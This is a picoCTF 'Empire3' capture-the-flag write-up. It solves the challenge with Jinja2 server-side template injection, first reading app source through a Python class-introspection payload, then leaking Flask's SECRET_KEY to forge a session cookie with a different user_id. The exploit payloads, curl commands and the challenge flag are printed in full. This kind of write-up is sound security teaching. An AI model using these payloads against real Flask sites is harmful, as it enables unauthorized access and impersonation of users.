# Empire3
Web Exploitation, 500 points

## Description:
> Agent 513! One of your dastardly colleagues is laughing very sinisterly! Can you access his todo list and discover his nefarious plans?


## Solution: 

This is the follow-up for [Empire2](Empire2.md).

We'll use the same solution that worked for the previous challenge:

```console
root@kali:/media/sf_CTFs/pico/Empire3# python shell.py
Logged in
(Cmd) send 4*4
Sending: '{{4*4}}'

16

(Cmd) send ''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__['open'](''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__.__import__('os').path.join('app', '__init__.py')).read
()
Sending: '{{''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__['open'](''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__.__import__('os').path.join('app', '__init__.py')).read()}}'

from flask import Flask
from app.config import Config
from flask_sqlalchemy import SQLAlchemy
from flask_login import LoginManager
from flask_bootstrap import Bootstrap
import time,atexit
from apscheduler.schedulers.background import BackgroundScheduler

app = Flask(__name__)
app.config.from_object(Config)
db = SQLAlchemy(app)
login = LoginManager(app)
login.login_view = 'login'
bootstrap=Bootstrap(app)

from app import routes,models

def DB_init(db):
    db.drop_all()
    db.create_all()

    u = models.User(username='jarrett.booz',password_hash='deadbeef',id=1,admin=0,secret='Likes Oreos.', name="Jarrett Booz")
    db.session.add(u)

    u = models.User(username='danny.tunitis',password_hash='deadbeef',id=2,admin=0,secret='Know it all.', name= "Danny Tunitis")
    db.session.add(u)

    c = models.Todo(item='Shrink the moon', user_id=1)
    db.session.add(c)

    c = models.Todo(item='Grab the moon', user_id=1)
    db.session.add(c)

    c = models.Todo(item='Sit on the toilet', user_id=1)
    db.session.add(c)

    c = models.Todo(item='Make 2000 more Pico problems', user_id=2)
    db.session.add(c)

    c = models.Todo(item='Do dastardly plan: picoCTF{cookies_are_a_sometimes_food_8038d44f}', user_id=2)
    db.session.add(c)

    c = models.Todo(item='Buy milk', user_id=2)
    db.session.add(c)

    db.session.commit()

try:
    DB_init(db)
    scheduler = BackgroundScheduler()
    scheduler.add_job(func=DB_init,args=(db,),trigger="interval",hours=2)
    scheduler.start()
    atexit.register(lambda: scheduler.shutdown())
except Exception as e:
    print(e)
```

The flag is related to cookies (`picoCTF{cookies_are_a_sometimes_food_8038d44f}`), so again, this looked like an unintended solution.

## Additional Solution

An additional way to solve the challenge, based on [another writeup](http://cyberchallenge.unica.it/index.php/2019/10/13/web-empire3/). This is probably the intended solution. It's also pretty similar to last year's [Flaskcards Skeleton Key](/2018_picoCTF/Flaskcards%20Skeleton%20Key.md)

First, we read the Flask configuration to get the secret key used for signing the cookies:

```console
root@kali:/media/sf_CTFs/pico/Empire3# python shell.py
Logged in
(Cmd) send config
Sending: '{{config}}'

<Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': '9806d62bb5f4986c09a3872abf448e85', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(0, 43200), 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093, 'SQLALCHEMY_DATABASE_URI': 'sqlite://', 'SQLALCHEMY_TRACK_MODIFICATIONS': False, 'SQLALCHEMY_BINDS': None, 'SQLALCHEMY_NATIVE_UNICODE': None, 'SQLALCHEMY_ECHO': False, 'SQLALCHEMY_RECORD_QUERIES': None, 'SQLALCHEMY_POOL_SIZE': None, 'SQLALCHEMY_POOL_TIMEOUT': None, 'SQLALCHEMY_POOL_RECYCLE': None, 'SQLALCHEMY_MAX_OVERFLOW': None, 'SQLALCHEMY_COMMIT_ON_TEARDOWN': False, 'SQLALCHEMY_ENGINE_OPTIONS': {}, 'BOOTSTRAP_USE_MINIFIED': True, 'BOOTSTRAP_CDN_FORCE_SSL': False, 'BOOTSTRAP_QUERYSTRING_REVVING': True, 'BOOTSTRAP_SERVE_LOCAL': False, 'BOOTSTRAP_LOCAL_SUBDOMAIN': None}>

(Cmd) exit

```

We sign in and save the cookie:

```console
root@kali:/media/sf_CTFs/pico/Empire3# base_url=https://2019shell1.picoctf.com/problem/45132; curl "$base_url/login" --cookie "cookies.txt" --cookie-jar "cookies.txt" -s -v --data "csrf_token=$(curl "$base_url/login" --cookie "cookies.txt" --cookie-jar "cookies.txt" -s | grep csrf | awk '{ printf $5 }' | sed 's/value="//g' | sed 's/">//')&username=user&password=password" 2>&1 | grep Cookie
> Cookie: session=.[AWS_SECRET_REMOVED]ewI9wIPv_bajzrw-2v1xPvPWjs_[AWS_SECRET_REMOVED]yU89hsIcKgc_[AWS_SECRET_REMOVED]IV7u1uM46Hj9f-f32qK5wMcG5MYeiR6Qr9EBWzHCLTJjA7-555fk_ge3vBWc8PpY.XaXtmg.iKsUADWNOPFQ4iKm3eYHoF4v0qI
< Vary: Cookie
```

We decode the cookie with [flask-session-cookie-manager](https://github.com/noraj/flask-session-cookie-manager) (note that I had to use the Python3 version this time, as the Python2 version created cookies that were rejected by the server in the next step):
```console
root@kali:/media/sf_CTFs/pico/Empire3# c=.[AWS_SECRET_REMOVED]ewI9wIPv_bajzrw-2v1xPvPWjs_[AWS_SECRET_REMOVED]yU89hsIcKgc_[AWS_SECRET_REMOVED]IV7u1uM46Hj9f-f32qK5wMcG5MYeiR6Qr9EBWzHCLTJjA7-555fk_ge3vBWc8PpY.XaXtmg.iKsUADWNOPFQ4iKm3eYHoF4v0qI

root@kali:/media/sf_CTFs/pico/Empire3# python3 ~/utils/flask-session-cookie-manager/flask_session_cookie_manager3.py decode -s '9806d62bb5f4986c09a3872abf448e85' -c "$c"
{'_fresh': True, '_id': '[AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED]b661f4ba', 'csrf_token': '[AWS_SECRET_REMOVED]', 'user_id': '3'}
```

Edit the cookie and set `user_id` to `2` instead of `3`:

```console
root@kali:/media/sf_CTFs/pico/Empire3# python3 ~/utils/flask-session-cookie-manager/flask_session_cookie_manager3.py encode -s '9806d62bb5f4986c09a3872abf448e85' -t "{'_fresh': True, '_id': '[AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED]b661f4ba', 'csrf_token': '[AWS_SECRET_REMOVED]', 'user_id': '2'}"
.[AWS_SECRET_REMOVED]7jbkAB_e_21HnXl9tPvjfOatHZ_[AWS_SECRET_REMOVED][AWS_SECRET_REMOVED]dyTGAwFGMeRTabrfm11nH4-crv98eke3GynPFzCHT3NMEuk-SmW7qmbCA3t3zyvN_AtrfC2c5PpU.XaX3qA.ORVdqh-0iJQkIjXNcElr5vSPjZY
```

List the TODOs with for user 2 and read the flag:
```console
root@kali:/media/sf_CTFs/pico/Empire3# curl "$base_url/list_items" -H "Cookie: session=.[AWS_SECRET_REMOVED]7jbkAB_e_21HnXl9tPvjfOatHZ_[AWS_SECRET_REMOVED][AWS_SECRET_REMOVED]dyTGAwFGMeRTabrfm11nH4-crv98eke3GynPFzCHT3NMEuk-SmW7qmbCA3t3zyvN_AtrfC2c5PpU.XaX3qA.ORVdqh-0iJQkIjXNcElr5vSPjZY" -s | grep picoCTF
                                <strong>Very Urgent: </strong>Do dastardly plan: picoCTF{cookies_are_a_sometimes_food_8038d44f}
```
